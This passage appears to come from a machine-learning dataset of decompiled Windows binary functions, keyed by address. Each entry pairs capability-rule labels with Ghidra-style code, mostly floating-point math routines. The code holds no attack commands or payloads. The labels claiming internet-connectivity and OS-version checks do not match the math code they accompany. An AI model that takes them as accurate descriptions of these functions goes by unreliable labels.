== 3) || (iVar2 == 2)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x22;\n        }\n        fVar3 = _var_ch;\n        if (var_10h != '\\0') {\n            *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        }\n    }\n    return fVar3;\n}\n",
        "token_count": 412
    },
    "004bc21d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004d6af7)\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.004bc21d(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    double dVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    char extraout_CL;\n    char extraout_CL_00;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar4;\n    int32_t extraout_ECX_01;\n    bool bVar5;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 fVar6;\n    float10 extraout_ST0_01;\n    float10 extraout_ST1;\n    float10 extraout_ST1_00;\n    float10 extraout_ST1_01;\n    float10 fVar7;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    uint unaff_retaddr;\n    uchar auStack120 [12];\n    uint16_t uStack108;\n    uchar auStack14 [10];\n    uint32_t arg_8h;\n    \n    arg_8h = in_EAX & 0xffff0000 | in_FPUControlWord;\n    uVar2 = in_EAX;\n    if (in_FPUControlWord != 0x27f) {\n        auStack14 = CONCAT46(0x4bc231, auStack14._0_6_);\n        in_EAX = fcn.00402b0d();\n        uVar2 = extraout_ECX;\n    }\n    bVar5 = (uVar2 & 0x7ff00000) == 0x7ff00000;\n    if (bVar5) {\n        if ((in_EAX & 0xfffff | param_3) == 0) {\n            auStack14 = CONCAT46(0x4bc2f9, auStack14._0_6_);\n            fVar6 = fcn.00403378();\n            iVar4 = extraout_ECX_01;\n            fVar7 = extraout_ST1_01;\n            in_ST6 = in_ST7;\n        }\n        else {\n            auStack14 = CONCAT46(0x4bc2bd, auStack14._0_6_);\n            uVar2 = fcn.00403378();\n            in_FPUStatusWord = in_FPUStatusWord & 0xfdff;\n            if (1 == extraout_ST0_01) goto code_r0x004bc2d3;\n            iVar4 = extraout_ECX_00 + 1;\n            fVar6 = extraout_ST0_01;\n            fVar7 = extraout_ST1_00;\n        }\ncode_r0x004bc2f9:\n        uVar2 = param_2 & 0x7ff00000;\n        if ((uVar2 == 0x7ff00000) && ((param_2 & 0xfffff | param_1) != 0)) {\n            fVar6 = 0;\n            uVar2 = ((fVar7 < fVar6) << 9 | (fVar7 != fVar6) << 10 | (fVar7 == fVar6) << 0xe) | 0x7ff00000;\n            if ((fVar7 == fVar6) != 0) {\ncode_r0x004bc2d3:\n                return CONCAT44(arg_8h, uVar2);\n            }\ncode_r0x004bc2db:\n            return CONCAT44(arg_8h, uVar2);\n        }\n        if (iVar4 != 0) goto code_r0x004bc2db;\n        uStack108 = in_FPUStatusWord;\n        auStack14 = in_ST6;\n        uVar2 = fcn.0040636b(SUB84(fVar6, 0), fVar6 >> 0x20, SUB84(fVar7, 0), fVar7 >> 0x20, auStack120);\n        if (uVar2 == 0) goto code_r0x00402b8a;\n        uVar2 = 1;\n    }\n    else {\n        auStack14 = CONCAT46(0x4bc24c, auStack14._0_6_);\n        uVar2 = fcn.00403378();\n        if (bVar5) {\n            iVar4 = 0;\n            fVar6 = extraout_ST0;\n            fVar7 = extraout_ST1;\n            in_ST6 = in_ST7;\n            goto code_r0x004bc2f9;\n        }\n        if (((uVar2 & 0x7ff00000) != 0) || ((param_2 & 0xfffff | param_1) != 0)) {\n            if ((param_2 & 0x80000000) != 0) {\n                auStack14 = CONCAT46(0x4bc3c3, auStack14._0_6_);\n                fcn.004bc3e1();\n                if (extraout_CL_00 == '\\0') {\n                    uVar2 = 1;\n                    goto code_r0x004bc295;\n                }\n            }\n            auStack14 = CONCAT46(0x4bc271, auStack14._0_6_);\n            uVar2 = fcn.00401609();\n            fVar6 = extraout_ST0_00;\n            if (extraout_CL == '\\x01') {\n                fVar6 = -extraout_ST0_00;\n            }\n            if (*0x5755dc == 0) {\n                dVar1 = fVar6;\n                auStack14 = CONCAT82(dVar1, auStack14._0_2_);\n                auStack14._6_4_ = dVar1 >> 0x20;\n                auStack14._6_4_ = auStack14._6_4_ & 0x7ff00000;\n                if ((dVar1 & 0x7ff0000000000000) == 0) {\n                    fscale(fVar6, *0x55ac4c);\n                }\n                else {\n                    if (auStack14._6_4_ != 0x7ff00000) {\n                        uVar2 = auStack14._6_4_ | arg_8h & 0xffff;\n                        if (arg_8h != 0x27f) {\n                            if (((arg_8h & 0x20) == 0) &&\n                               (uVar2 = auStack14._6_4_ | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0))\n                            goto code_r0x004d6afe;\n                            uVar2 = uVar2 & 0xffff0020;\n                        }\n                        return CONCAT44(arg_8h, uVar2);\n                    }\n                    fscale(fVar6, *0x55ac44);\n                }\ncode_r0x004d6afe:\n                auStack14 = CONCAT46(0x4d6b03, auStack14._0_6_);\n                uVar3 = fcn.00402801(arg_8h, unaff_retaddr, param_1, param_2, param_3, param_4);\n                return CONCAT44(arg_8h, uVar3);\n            }\n            goto code_r0x00402b8a;\n        }\n        uVar2 = param_4 & 0x7fffffff | param_3;\n        if (uVar2 == 0) goto code_r0x00402b8a;\n        auStack14 = CONCAT46(0x4bc37b, auStack14._0_6_);\n        uVar2 = fcn.004bc3e1();\n        if ((param_4 >> 0x18 & 0x80) == 0) goto code_r0x00402b8a;\n        uVar2 = 2;\n    }\ncode_r0x004bc295:\n    if (*0x5755dc == 0) {\n        auStack14 = CONCAT46(0x4bc2b2, auStack14._0_6_);\n        uVar3 = fcn.00402801(arg_8h, unaff_retaddr, param_1, param_2, param_3, param_4);\n        return CONCAT44(arg_8h, uVar3);\n    }\ncode_r0x00402b8a:\n    return CONCAT44(arg_8h, uVar2);\n}\n",
        "token_count": 1889
    },
    "004c6136": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c6136(int32_t arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    if (*0x57548c == 0) {\n        var_4h = arg_8h;\n        if (-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) {\n            fcn.00403765(&var_4h);\n        }\n        *0x57548c = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004c6189": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c6189(int32_t arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    if (*0x575490 == 0) {\n        var_4h = arg_8h;\n        if (-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) {\n            fcn.00402d24(&var_4h);\n        }\n        *0x575490 = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "004cb5cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004cb5cc(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_19h;\n    \n    if (*(unaff_EBP + -0x19) != '\\0') {\n        fcn.00401ce9(3);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004cbb55": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004cbb55(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar2 != 0) {\n        if (arg_8h != 0) {\n            fcn.00401b45(arg_8h);\n        }\n        iVar3 = fcn.00401adc();\n        if (iVar3 != 1) {\n            return 4;\n        }\n    }\n    iVar3 = fcn.00404c14();\n    if ((iVar3 == 2) && (cVar1 = fcn.00402e5a(),  cVar1 != '\\0')) {\n        cVar1 = fcn.00404dd6();\n        if (cVar1 == '\\0') {\n            arg_10h = arg_10h | 0x200000;\n            arg_8h_00 = 0;\n        }\n        else {\n            arg_8h_00 = fcn.00401a96();\n        }\n        iVar2 = fcn.00404363(arg_8h_00, arg_8h, arg_ch, arg_10h);\n        return iVar2;\n    }\n    return (iVar2 != 0) + 3;\n}\n",
        "token_count": 318
    },
    "004d55e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004d55e9(double param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    bool bVar11;\n    double dVar12;\n    double dVar13;\n    ulong in_XMM1_Qa;\n    double dVar14;\n    uchar auVar15 [16];\n    uint64_t in_XMM2_Qa;\n    int64_t iVar16;\n    uchar auVar17 [16];\n    int64_t iVar18;\n    uint64_t in_XMM3_Qa;\n    uint64_t uVar19;\n    double dVar20;\n    double dVar21;\n    double dVar22;\n    double dVar23;\n    double dVar24;\n    double dVar25;\n    double dVar26;\n    uchar auStack12 [4];\n    \n    dVar12 = param_1 >> 0x2c;\n    uVar1 = param_1 >> 0x30;\n    uVar3 = (SUB82(dVar12, 0) & 0xff) + 1 & 0x1fe;\n    dVar25 = (*0x55aa80 & param_1 | *0x55aa90) * *(uVar3 * 4 + 0x55d748);\n    dVar22 = *(uVar3 * 4 + 0x55d748);\n    dVar13 = *(uVar3 * 8 + 0x55dc30);\n    dVar24 = *(uVar3 * 8 + 0x55dc38);\n    uVar7 = 0x7fef - uVar1;\n    uVar3 = SUB84(param_1, 0);\n    uVar9 = param_1 >> 0x20;\n    dVar23 = param_1;\n    if ((uVar1 - 0x10 | uVar7) < 0x80000000) {\n        uVar7 = 0;\n        uVar8 = 0x3fe7f;\ncode_r0x004d5666:\n        uVar4 = (dVar25 >> 0x26 & 0xff) + 1 & 0x1fe;\n        dVar25 = dVar25 * *(uVar4 * 4 + 0x55e5e0);\n        dVar20 = dVar23 & *0x55aa80 | *0x55aa90;\n        dVar14 = *0x55aad8 & dVar20;\n        in_XMM3_Qa = in_XMM3_Qa >> 0x1f;\n        dVar20 = dVar20 - dVar14;\n        uVar5 = (dVar25 >> 0x1f & 0x1ff) + 1 & 0x3fe;\n        dVar21 = dVar22 * *(uVar4 * 4 + 0x55e5e0) * *(uVar5 * 4 + 0x55f470);\n        dVar25 = dVar25 * *(uVar5 * 4 + 0x55f470);\n        dVar23 = dVar13 + *(uVar4 * 8 + 0x55eac0) + (dVar12 - uVar8 >> 8) + *(uVar5 * 8 + 0x55fe20);\n        dVar12 = dVar24 + *(uVar4 * 8 + 0x55eac8) + *(uVar5 * 8 + 0x55fe28);\n        dVar13 = *0x55aad8 & dVar21;\n        dVar21 = dVar21 - dVar13;\n        dVar26 = *0x55aae0 + dVar25;\n        dVar24 = dVar23 + dVar26;\n        dVar22 = CONCAT44(param_3, param_2);\n        uVar2 = param_3 >> 0x10;\n        dVar23 = dVar23 - dVar24;\n        uVar4 = dVar24 >> 0x30;\n        dVar13 = (((dVar25 - dVar13 * dVar14) - dVar14 * dVar21) - dVar13 * dVar20) - dVar20 * dVar21;\n        dVar14 = dVar26 - dVar13;\n        dVar25 = dVar24 - dVar13;\n        uVar8 = uVar2 & 0x7ff0;\n        if (uVar8 < 0x7ff0) {\n            iVar6 = (uVar8 - 0x3ff0) + (uVar4 & 0x7ff0);\n            if ((0x40a0U - iVar6 | iVar6 - 0x3c70U) < 0x80000000) {\ncode_r0x004d57b8:\n                dVar20 = *0x55aad8 & dVar22;\n                dVar21 = *0x55aad8 & dVar25;\n                dVar13 = (dVar23 + dVar26) - (dVar13 - (dVar24 - dVar25));\n                auVar17 = pinsrw(ZEXT816(0), 0x4060, 3);\n                dVar24 = dVar20 * dVar21 * SUB168(auVar17, 0);\n                uVar3 = ROUND(dVar24);\n                dVar22 = dVar20 * (dVar25 - dVar21) + dVar21 * (dVar22 - dVar20) + (dVar25 - dVar21) * (dVar22 - dVar20)\n                ;\n                if (0 < (0x1ff7f - uVar3 | uVar3 + 0x1e1ff)) {\n                    iVar6 = (uVar3 & 0x7f) * 0x10;\n                    auVar17 = pinsrw(ZEXT816(0), 0x3f80, 3);\n                    uVar3 = ((uVar7 + uVar3 & 0xffffff80) + 0x1ff80 << 0x2d) >> 0x20;\n                    dVar25 = *(iVar6 + 0x5611a0) * (uVar3 << 0x20);\n                    dVar22 = (dVar24 - ((dVar24 + *0x55aa70) - *0x55aa70)) * SUB168(auVar17, 0) +\n                             dVar22 + ((*0x561170 * dVar14 + *0x561180 * dVar14 * dVar14) * dVar14 * dVar14 +\n                                       *0x561178 * dVar14 + str._aAiFC.._0_8_ * dVar14 * dVar14 + dVar12 + dVar13) *\n                                      CONCAT44(param_3, param_2);\n                    return dVar22 * dVar22 * dVar25 * (*0x55aac0 + *0x55aab0 * dVar22) * dVar22 * dVar22 +\n                           *(iVar6 + 0x5611a8) * SUB128((ZEXT412(uVar3) << 0x40) >> 0x20, 0) +\n                           (*0x55aac8 + *0x55aab8 * dVar22) * dVar22 * dVar22 * dVar25 + *0x55aad0 * dVar22 * dVar25 +\n                           dVar25;\n                }\n                if (uVar3 < 1) {\n                    if (uVar3 < -0x3fdff) {\ncode_r0x004d6017:\n                        uVar10 = 0x19;\n                        _auStack12 = *0x55ab18 * *0x55ab18 | uVar7 << 0x2d;\n                        goto code_r0x004d5dbe;\n                    }\n                    uVar7 = uVar7 + 0x80;\n                    uVar9 = (uVar3 & 0xffffff80) + 0x3fe80;\n                    uVar10 = 0;\n                }\n                else {\n                    if (0x3ffff < uVar3) goto code_r0x004d603a;\n                    uVar7 = uVar7 + 0x3ff00;\n                    uVar9 = uVar3 - 0x80 & 0xffffff80;\n                    uVar10 = 0x3ff0;\n                }\n                iVar6 = (uVar3 & 0x7f) * 0x10;\n                uVar3 = (-(uVar9 - 0x1ff80) >> 7) + 2;\n                auVar17 = pinsrw(ZEXT816(0), 0x3f80, 3);\n                uVar8 = (uVar9 << 0x2d) >> 0x20;\n                dVar25 = *(iVar6 + 0x5611a0) * (uVar8 << 0x20);\n                dVar22 = (dVar24 - ((dVar24 + *0x55aa70) - *0x55aa70)) * SUB168(auVar17, 0) +\n                         dVar22 + ((*0x561170 * dVar14 + *0x561180 * dVar14 * dVar14) * dVar14 * dVar14 +\n                                   *0x561178 * dVar14 + str._aAiFC.._0_8_ * dVar14 * dVar14 + dVar12 + dVar13) *\n                                  CONCAT44(param_3, param_2);\n                _auStack12 = uVar7 << 0x2d;\n                uVar19 = uVar3 + (uVar3 & 0x20);\n                dVar13 = -1 << uVar19 & dVar25;\n                dVar22 = dVar22 * dVar22 * dVar25 * (*0x55aac0 + *0x55aab0 * dVar22) * dVar22 * dVar22 +\n                         *(iVar6 + 0x5611a8) * SUB128((ZEXT412(uVar8) << 0x40) >> 0x20, 0) +\n                         (*0x55aac8 + *0x55aab8 * dVar22) * dVar22 * dVar22 * dVar25 + *0x55aad0 * dVar22 * dVar25;\n                dVar24 = dVar13 + dVar22 & -1 << uVar19;\n                auVar17 = pinsrw(ZEXT816(0), uVar10, 3);\n                dVar22 = dVar22 + (dVar13 - dVar24) + (dVar25 - dVar13);\n                if (uVar9 - 0x1ff80 < 1) {\n                    _auStack12 = dVar22 * _auStack12 + dVar24 * _auStack12;\n                    _auStack12 = _auStack12 + SUB168(auVar17, 0) * _auStack12;\n                    uVar10 = 0x18;\n                    if (((_auStack12 >> 0x30 & 0x7ff0) != 0x7ff0) &&\n                       (uVar10 = 0x19,  (_auStack12 & 0x7ff0000000000000) != 0)) {\n                        return _auStack12;\n                    }\n                }\n                else {\n                    _auStack12 = (dVar22 + dVar24) * _auStack12;\n                    _auStack12 = _auStack12 + SUB168(auVar17, 0) * _auStack12;\n                    uVar10 = 0x18;\n                    if (((_auStack12 >> 0x30 & 0x7ff0) != 0x7ff0) &&\n                       (uVar10 = 0x19,  (_auStack12 & 0x7ff0000000000000) != 0)) {\n                        return _auStack12;\n                    }\n                }\n            }\n            else {\n                dVar24 = dVar22 * dVar25;\n                uVar3 = dVar24 >> 0x30 & 0x7ff0;\n                uVar9 = uVar3 - 0x3c70;\n                if ((0x40a0 - uVar3 | uVar9) < 0x80000000) goto code_r0x004d57b8;\n                if (0x7fffffff < uVar9) {\n                    return (uVar7 | 0x1ff80) << 0x2d;\n                }\n                if (((uVar2 ^ (uVar1 & 0x7ff0) + 0xc010) & 0x8000) != 0) goto code_r0x004d6017;\ncode_r0x004d603a:\n                uVar10 = 0x18;\n                if (uVar7 == 0) {\n                    _auStack12 = *0x55ab10 * *0x55ab10;\n                }\n                else {\n                    _auStack12 = *0x55ab08 * *0x55ab10;\n                }\n            }\n            goto code_r0x004d5dbe;\n        }\n        auVar17 = CONCAT88(in_XMM2_Qa, CONCAT44(param_3, param_2));\n        bVar11 = uVar3 == 0;\n        uVar3 = uVar4;\n        if (bVar11) {\n            if (uVar9 == 0x3ff00000) goto code_r0x004d5dbb;\n            uVar3 = uVar9;\n            if (uVar9 == 0xbff00000) {\n                return 1;\n            }\n        }\n    }\n    else {\n        auVar17 = CONCAT88(in_XMM2_Qa, CONCAT44(param_3, param_2));\n        uVar8 = param_3 & *0x55aaa4;\n        uVar19 = in_XMM3_Qa >> 0x20;\n        if (uVar8 < 0x7ff00000) {\n            if ((param_2 | uVar8) == 0) {\n                uVar10 = 0x1a;\n                _auStack12 = *0x55aa90;\n                if ((uVar3 | uVar9 & 0x7fffffff) != 0) {\n                    uVar10 = 0x1d;\n                    if (((uVar9 & 0x7fffffff) < 0x7ff00001) && (((uVar9 & 0x7fffffff) < 0x7ff00000 || (uVar3 == 0)))) {\n                        return *0x55aa90;\n                    }\n                }\n                goto code_r0x004d5dbe;\n            }\n            if (uVar7 < 0) {\n                auVar17 = auVar17 | CONCAT88(in_XMM3_Qa << 0x34, CONCAT44(*0x55aaa4, *0x55aaa0) << 0x34);\n                in_XMM3_Qa = 0;\n                auVar15 = pmaxsw(ZEXT1216(CONCAT48((in_XMM1_Qa >> 0x20 & uVar19) >> 0x14, (uVar8 >> 0x14) - 0x3f3)), 0x0\n                                );\n                iVar16 = SUB168(auVar17, 0) << SUB168(auVar15, 0);\n                iVar18 = SUB168(auVar17 >> 0x40, 0) << SUB168(auVar15 >> 0x40, 0);\n                auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                    CONCAT48(-(iVar18 == 0), CONCAT44(-(iVar16 >> 0x20 == 0), -(iVar16 == 0))));\n                uVar2 = SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7;\n                uVar8 = 0x7fef - uVar7 & 0x7fff;\n                uVar19 = SUB168(auVar17 >> 0x40, 0);\n                if (0x7fef < uVar8) {\n                    auVar17 = CONCAT412(0xffffffff, \n                                        CONCAT48(0xffffffff, \n                                                 CONCAT44(-((*0x55aa80 & param_1) >> 0x20 == 0), \n                                                          -((*0x55aa80 & param_1) == 0))));\n                    if ((SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) == 0xff) {\n                        if ((param_1 & 0x8000000000000000) != 0) {\n                            if ((uVar2 != 0xff) ||\n                               (iVar16 = CONCAT44(param_3, param_2) << ((param_3 & *0x55aaa4) >> 0x14) - 0x3f4, \n                               iVar18 = uVar19 << (*0x55aaac >> 0x14), \n                               auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                                   CONCAT48(-(iVar18 == 0), \n                                                            CONCAT44(-(iVar16 >> 0x20 == 0), -(iVar16 == 0)))), \n                               (SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) == 0xff))\n                            {\n                                if ((param_3 & 0x80000000) != 0) {\n                                    return 0;\n                                }\n                                goto code_r0x004d5d4f;\n                            }\n                            if ((param_3 & 0x80000000) == 0) {\n                                return *0x55aaf8;\n                            }\n                            goto code_r0x004d5c09;\n                        }\n                        if ((param_3 & 0x80000000) != 0) {\n                            return 0;\n                        }\n                        goto code_r0x004d5d4f;\n                    }\n                    goto code_r0x004d5c4f;\n                }\n                if (uVar2 == 0xff) {\n                    in_XMM3_Qa = 0;\n                    iVar16 = CONCAT44(param_3, param_2) << ((param_3 & *0x55aaa4) >> 0x14) - 0x3f4;\n                    iVar18 = uVar19 << ((SUB164(auVar15 >> 0x60, 0) & *0x55aaac) >> 0x14);\n                    auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                        CONCAT48(-(iVar18 == 0), \n                                                 CONCAT44(-(iVar16 >> 0x20 == SUB164(ZEXT816(*0x55ab00) >> 0x20, 0)), \n                                                          -(iVar16 == SUB84(*0x55ab00, 0)))));\n                    in_XMM2_Qa = SUB168(auVar17 >> 0x40, 0);\n                    uVar7 = (SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                             (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                             (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                             (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) + 0x3ff01 &\n                            0x40000;\n                    if (0xf < uVar8) {\n                        uVar8 = 0xbfe7f;\n                        in_XMM3_Qa = 0;\n                        goto code_r0x004d5666;\n                    }\n                    goto code_r0x004d5a84;\n                }\n                dVar22 = param_1 >> 0x20;\n                in_XMM2_Qa = uVar19 >> 0x20;\n                uVar8 = uVar3 | uVar9 & 0x7fffffff;\n                uVar7 = 0;\n                dVar23 = dVar12;\n                if (uVar8 != 0) {\n                    uVar10 = 0x1c;\n                    _auStack12 = *0x55ab20;\n                    goto code_r0x004d5dbe;\n                }\ncode_r0x004d5b0a:\n                if ((uVar8 & 0x7fffffff) == 0) {\n                    if ((param_3 & 0x80000000) == 0) {\n                        if ((uVar8 & uVar7 << 0xd) == 0) {\n                            return 0;\n                        }\ncode_r0x004d5c09:\n                        return *0x55ab00;\n                    }\n                    uVar10 = 0x1b;\n                    _auStack12 = (uVar8 & uVar7 << 0xd | 0x7ff00000) << 0x20;\n                    goto code_r0x004d5dbe;\n                }\n            }\n            else {\n                uVar7 = 0;\ncode_r0x004d5a84:\n                auVar17 = pinsrw(ZEXT816(0), 0x43f0, 3);\n                dVar23 = SUB168(auVar17, 0) * param_1;\n                uVar8 = uVar9;\n                dVar25 = *0x55aa80;\n                dVar22 = *0x55aa90;\n                if (uVar3 == 0) goto code_r0x004d5b0a;\n            }\n            dVar12 = (dVar23 & CONCAT44(*0x55aaa4, *0x55aaa0)) >> 0x2c;\n            uVar8 = (SUB82(dVar12, 0) & 0xff) + 1 & 0x1fe;\n            dVar25 = (dVar25 & dVar23 | dVar22) * *(uVar8 * 4 + 0x55d748);\n            dVar22 = *(uVar8 * 4 + 0x55d748);\n            dVar13 = *(uVar8 * 8 + 0x55dc30);\n            dVar24 = *(uVar8 * 8 + 0x55dc38);\n            uVar8 = 0x43e7f;\n            goto code_r0x004d5666;\n        }\n        uVar7 = uVar9;\n        if ((0x7fefffff < (uVar9 & 0x7fffffff)) && ((0x7ff00000 < (uVar9 & 0x7fffffff) || (uVar3 != 0)))) {\ncode_r0x004d5c4f:\n            _auStack12 = param_1 + param_1;\n            uVar10 = 0x3ee;\n            goto code_r0x004d5dbe;\n        }\n    }\n    dVar22 = SUB168(auVar17, 0);\n    uVar19 = in_XMM3_Qa & SUB168(auVar17 >> 0x40, 0);\n    auVar15 = CONCAT412(-(uVar19 >> 0x20 == 0), \n                        CONCAT48(-(uVar19 == 0), \n                                 CONCAT44(-((*0x55aa80 & dVar22) >> 0x20 == 0), -((*0x55aa80 & dVar22) == 0))));\n    if ((SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 | (SUB161(auVar15 >> 0x17, 0) & 1) << 2 |\n         (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 | (SUB161(auVar15 >> 0x27, 0) & 1) << 4 |\n         (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar15 >> 0x37, 0) & 1) << 6 |\n        (SUB161(auVar15 >> 0x3f, 0) & 1) << 7) == 0xff) {\n        if ((uVar3 | uVar7 ^ 0xbff00000) != 0) {\n            if ((auVar17 & 0x8000000000000000) == 0x0) {\n                if ((uVar1 & 0x7ff0) < 0x3ff0) {\n                    return 0;\n                }\n            }\n            else if (0x3fef < (uVar1 & 0x7ff0)) {\n                return 0;\n            }\ncode_r0x004d5d4f:\n            return *0x55aaf0;\n        }\ncode_r0x004d5dbb:\n        return 1;\n    }\n    uVar10 = 0x3ee;\n    _auStack12 = dVar22 + dVar22;\ncode_r0x004d5dbe:\n    fcn.0040448f(&param_1, &param_2, auStack12, uVar10);\n    return _auStack12;\n}\n",
        "token_count": 6244
    },
    "004e1168": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004e1168(uint param_1, uint32_t param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uint uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool in_ZF;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    uint unaff_retaddr;\n    uint32_t arg_8h;\n    \n    arg_8h = param_2 & 0xffff0000 | in_FPUControlWord;\n    if (in_ZF) {\n        if (((in_EAX & 0xfffff) == 0) && (param_3 == 0)) {\n            uVar2 = in_EAX & 0x80000000;\n            uVar3 = uVar2;\n            goto joined_r0x004e11b7;\n        }\n        uVar3 = fcn.0040663b();\n    }\n    else {\n        uVar3 = param_4;\n        if ((param_4 & 0x7ff00000) == 0) {\n            if (((param_4 & 0xfffff) == 0) && (param_3 == 0)) {\n                uVar3 = 2;\n                goto code_r0x004e1201;\n            }\n            uVar2 = param_4 & 0x80000000;\n        }\n        else {\n            uVar2 = param_4 & 0x80000000;\n        }\njoined_r0x004e11b7:\n        if (uVar2 == 0) {\n            if (*0x5755dc == 0) {\n                uVar2 = uVar3 & 0xffff0000 | in_FPUControlWord;\n                if (in_FPUControlWord != 0x27f) {\n                    if (((in_FPUControlWord & 0x20) != 0) &&\n                       (uVar2 = uVar3 & 0xffff0000 | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0)) {\n                        uVar1 = fcn.0040313e(arg_8h, unaff_retaddr, param_3, param_4);\n                        return CONCAT44(arg_8h, uVar1);\n                    }\n                    uVar2 = uVar2 & 